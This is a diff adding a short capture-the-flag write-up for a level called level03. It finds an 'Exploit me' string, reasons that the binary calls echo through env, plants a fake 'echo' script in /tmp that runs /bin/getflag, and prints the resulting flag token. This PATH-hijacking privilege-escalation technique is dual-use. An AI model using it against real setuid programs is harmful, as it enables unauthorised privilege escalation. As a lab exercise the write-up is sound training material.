@@ -1,0 +1,11 @@
+strings level03 | grep "Exploit me"
+
+/usr/bin/env echo Exploit me -> the exploit me strongle suggest a system() call like vulnerble to path manipulation
+
+mkdir /tmp/myexploit
+cd /tmp/myexploit
+echo '#!/bin/bash' > echo
+echo '/bin/getflag' >> echo
+
+./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
